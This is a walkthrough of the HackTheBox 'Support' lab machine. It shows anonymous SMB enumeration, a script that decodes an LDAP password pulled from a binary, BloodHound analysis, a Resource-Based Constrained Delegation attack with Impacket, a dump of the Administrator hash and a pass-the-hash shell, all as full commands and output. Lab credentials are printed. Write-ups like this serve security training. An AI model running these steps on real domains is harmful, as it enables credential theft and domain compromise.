---
title: "HackTheBox - Support"
author: Nasrallah
description: ""
date: 2025-10-03 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy, rbcd, smb, dnspy]
img_path: /assets/img/hackthebox/machines/support
image:
    path: support.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[Support](https://app.hackthebox.com/machines/support) is an Easy difficulty Windows machine that features an SMB share that allows anonymous authentication. After connecting to the share, an executable file is discovered that is used to query the machine's LDAP server for available users. Through reverse engineering, network analysis or emulation, the password that the binary uses to bind the LDAP server is identified and can be used to make further LDAP queries. A user called `support` is identified in the users list, and the `info` field is found to contain his password, thus allowing for a WinRM connection to the machine. Once on the machine, domain information can be gathered through `SharpHound`, and `BloodHound` reveals that the `Shared Support Accounts` group that the `support` user is a member of, has `GenericAll` privileges on the Domain Controller. A Resource Based Constrained Delegation attack is performed, and a shell as `NT Authority\System` is received.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.174
Host is up (0.13s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-19 08:11:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-19T08:11:48
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

The target is a domain controller with the domain name `support.htb`.

We can use netexec to generate a hosts file for us.

```bash
nxc smb 10.129.230.181 --generate-hosts-file file
```

Let's add `10.129.230.181     DC.support.htb support.htb DC` to our `/etc/hosts`

### SMB

Let's list shares.

```terminal
[★]$ nxc smb 10.129.230.181 -u 'guest' -p '' --shares
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domin:support.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.230.181  445    DC               [+] support.htb\guest: 
SMB         10.129.230.181  445    DC               [*] Enumerated shares
SMB         10.129.230.181  445    DC               Share           Permissions     Remark
SMB         10.129.230.181  445    DC               -----           -----------     ------
SMB         10.129.230.181  445    DC               ADMIN$                          Remote Admin
SMB         10.129.230.181  445    DC               C$                              Default share
SMB         10.129.230.181  445    DC               IPC$            READ            Remote IPC
SMB         10.129.230.181  445    DC               NETLOGON                        Logon server share 
SMB         10.129.230.181  445    DC               support-tools   READ            support staff tools
SMB         10.129.230.181  445    DC               SYSVOL                          Logon server share
```

There is a shared named `support-tools` that we can read, let's connect to it.

```terminal
[★]$ smbclient //support.htb/support-tools -N                         
Try "help" to get a list of possible commands.                            
smb: \> ls                                                                
  .                                   D        0  Wed Jul 20 18:01:06 2022
  ..                                  D        0  Sat May 28 12:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 12:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 12:19:55 2022
  putty.exe                           A  1273576  Sat May 28 12:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 12:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 18:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 12:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 12:19:43 2022                                                                                                                 
                                                                          
                4026367 blocks of size 4096. 959141 blocks available      
smb: \> get UserInfo.exe.zip                                              
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (146.9 KiloBytes/sec) (average 146.9 KiloBytes/sec)
```

We find multiple zip and exe files for known tools, but the UserInfo.exe.zip doesn't sound familiar so I downloaded it to my machine.

Let's unzip the file.

```terminal
[★]$ unzip UserInfo.exe.zip                   
Archive:  UserInfo.exe.zip                        
  inflating: UserInfo.exe                         
  inflating: CommandLineParser.dll                
  inflating: Microsoft.Bcl.AsyncInterfaces.dll    
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll
  inflating: Microsoft.Extensions.DependencyInjection.dll 
  inflating: Microsoft.Extensions.Logging.Abstractions.dll
  inflating: System.Buffers.dll                   
  inflating: System.Memory.dll                    
  inflating: System.Numerics.Vectors.dll          
  inflating: System.Runtime.CompilerServices.Unsafe.dll   
  inflating: System.Threading.Tasks.Extensions.dll
  inflating: UserInfo.exe.config 
```

There are multiple dll files, the .config doesn't show anything important.

I'll copy the `UserInfo.exe` to my windows machine and open it using [dsnpy](https://dnspy.org/)

![ldap](1.png)

After some inspection we find a function that makes an ldap query and provides a username and a password.

Let's open the protected function now.

![protected](2.png)

We got the password but it's encoded with base64 and XOR with the key `armando`.

I'll decode it using the following python script.

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

# Step 1: Decode the Base64 string
data = base64.b64decode(enc_password)

# Step 2: XOR decryption with key and 223
decrypted = bytes([b ^ key[i % len(key)] ^ 223 for i, b in enumerate(data)])

# Step 3: Convert to string
print(decrypted.decode('utf-8', errors='ignore'))
```

```terminal
[★]$ python dec.py
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

We got the password, now let's try to authenticate as user `ldap`.

```terminal
[★]$ nxc smb 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'               
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domin:support.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.230.181  445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

It works.

### Bloodhound

I'll run bloodhound collection using netexec.

```terminal
[★]$ nxc ldap 10.10.11.174 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --bloodhound --collection all --dns-server 10.10.11.174
LDAP        10.10.11.174    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.10.11.174    389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
LDAP        10.10.11.174    389    DC               Resolved collection methods: trusts, container, group, objectprops, psremote, dcom, acl, rdp, localadmin, session
LDAP        10.10.11.174    389    DC               Done in 0M 22S
LDAP        10.10.11.174    389    DC               Compressing output into /home/sirius/.nxc/logs/DC_10.10.11.174_2025-07-19_105938_bloodhound.zip
```

Listing shortest path to domain admin we get the following.

![domain](3.png)

The user support is out way, but we don't have a password. Let's list the user's properties using `powerview.py`

![pwer](4.png)

We got what looks like a password in the info property! Let's test it.

```terminal
[★]$ nxc smb 10.10.11.174 -u support -p Ironside47pleasure40Watchful       
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.174    445    DC               [+] support.htb\support:Ironside47pleasure40Watchful 
```

User support is a member of a group that has GenericAll ove the DC, having that allows us to perform a Resource-Based Constrained Delegation attack by creating a computer and giving it the AllowedToAct permissions.

First let's check if we can create machines by reading the MachineAccountQuota Attribute.

```terminal
[★]$ nxc ldap 10.10.11.174 -u support -p Ironside47pleasure40Watchful -M maq                                                         
LDAP        10.10.11.174    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.10.11.174    389    DC               [+] support.htb\support:Ironside47pleasure40Watchful 
MAQ         10.10.11.174    389    DC               [*] Getting the MachineAccountQuota
MAQ         10.10.11.174    389    DC               MachineAccountQuota: 10
```

Great! We can create up to 10 machines

I'll create a computer with the name `Comp$` and password 'SomePassword!` using `addcomputer.py`

```terminal
[★]$ addcomputer.py -computer-name 'Comp$' -computer-pass 'SomePassword!' -dc-host "dc.support.htb" -domain-netbios "support.htb" ""support.htb/"support":"Ironside47pleasure40Watchful"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies                                                                                                                         

[*] Successfully added machine account Comp$ with password SomePassword!.
```

Now I'll give my computer the delegation rights on DC$

```terminal
[★]$ rbcd.py -delegate-from 'Comp$' -delegate-to 'dc$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] Comp$ can now impersonate users on dc$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     Comp$        (S-1-5-21-1677581083-3380853377-188903654-5601
```

Now we can request a ticket as DC$.

```terminal
[★]$ getST.py -spn 'cifs/dc.support.htb' -impersonate 'dc$' 'support.htb/Comp$:SomePassword!'                                                                                           
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating dc$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc$@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

We got the ticket, now we can use it to dump the nt hash of users using `secretsdump`.

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-07-19 12:16]-[~/ctf/htb/support]
└──╼[★]$ KRB5CCNAME=dc\$@cifs_dc.support.htb@SUPPORT.HTB.ccache secretsdump.py -k dc.support.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
```

We can use the administrator's hash to get a shell via winrm

```terminal
[★]$ evil-winrm -i support.htb -u administrator -H 'bb06cbc02b39abeddd1335bc30b19e26'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
